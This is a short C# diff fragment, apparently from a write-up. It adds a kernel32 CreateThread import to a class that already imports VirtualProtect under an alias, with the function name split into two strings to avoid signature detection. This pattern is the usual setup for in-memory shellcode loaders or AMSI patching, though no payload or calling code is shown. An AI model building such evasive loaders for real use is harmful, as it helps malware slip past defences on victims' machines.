@@ -19,5 +19,13 @@ public class K2 {
     [DllImport("kernel32", EntryPoint="Virtual" + "Protect")]
     public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     [DllImport("kernel32", SetLastError = true)]
+    public static extern IntPtr CreateThread(
+        IntPtr lpThreadAttributes,
+        uint dwStackSize,
+        IntPtr lpStartAddress,
+        IntPtr lpParameter,
+        uint dwCreationFlags,
+        out IntPtr lpThreadId
+    );
     ...
 ```
